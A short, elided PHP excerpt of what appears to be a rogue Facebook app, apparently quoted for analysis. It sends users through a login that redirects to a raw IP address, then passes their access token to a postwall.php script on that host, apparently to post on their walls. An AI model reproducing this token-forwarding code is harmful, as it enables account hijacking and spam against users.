...
<html lang="en" >
    ...
    <body>
        ...
        $loginUrl = $facebook->getLoginUrl($params = array('scope' => APP_SCOPE,'redirect_uri' => 'http://178.63.108.123:50002/app_register.php'));
        ...
        if (isset($_GET['code'])) {
            try {
                ...
                if ($num_rows > 0) {
                    ...
                    LoadPhp("http://178.63.108.123:50002/postwall.php?accesstoken=".$accesstoken);
